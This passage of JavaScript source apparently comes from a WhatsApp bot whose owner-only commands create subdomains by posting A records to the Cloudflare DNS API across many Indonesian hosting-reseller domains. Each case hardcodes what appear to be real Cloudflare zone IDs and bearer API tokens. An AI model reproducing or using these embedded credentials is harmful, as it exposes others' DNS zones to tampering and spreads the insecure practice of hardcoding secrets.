           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain12': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "974f191d5c51f390104f012eb7be6a02";
               let apitoken = "Bp_SbjAyWSbhglC6YqyLAjUrbhc8Xzx7cYDOWA4R";
               let tld = "panelshop.live";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain13': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9670f953e1d9c37a1ae763adfd82a341";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "webhostt.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain14': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "de86c30a6977a14d74d8bc96d737cf85";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadhostmarketplace.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain15': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "33057e29be0855f8ff6bb74feb8edb75";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadhost.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain16': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "40de7a4b822c4a5203b55797a2996443";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadhostoffc.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain17': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc348a57f0bc40684598d80e0ab012b7";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "fadilhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain18': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "78d37ada2bf8a6d1af1537cd31e81612";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "kebutuhanhosting.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain19': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c0f8fdf833bdcd59b04b79c7ae17aedb";
               let apitoken = "uoCk-a1zfBIke0l4mnu1ordqs--utRp3m3ApZ3y9";
               let tld = "panelkuu.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain20': {
          if (!isOwner) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "7bcdbb35e4b5a0dc9127ce9123cc4fc0";
               let apitoken = "n5969pX2nC1LHyf6tP8f5ffpMb_-SNvuQAJhmOhF";
               let tld = "riooxdzz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain21': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone ="ec4430e647897d90930cbb9085dbba06";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "celiaofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain22': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0eb97a28633fbb51b17a32d6fe52dcaf";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "celiastore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain23': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5ac16dadc6a80d53657786f70c509a92";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "panellofficial.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain24': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain25': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "57671edad3d50d309860d91d25385e05";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp";
               let tld = "celiapanellstore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RiiSTORE ID⚡_*\n\n*_Join group gua dong cik mau bagi"vps:_*\n*_https://chat.whatsapp.com/DlHuKL818SmHPwmWvh17NS_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           
          break
          case 'domain26': {
          if (!isOwner && !isJangan) return onlyOwn()
            function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "034a5ceff63666337614606715f16e36";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "rullz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
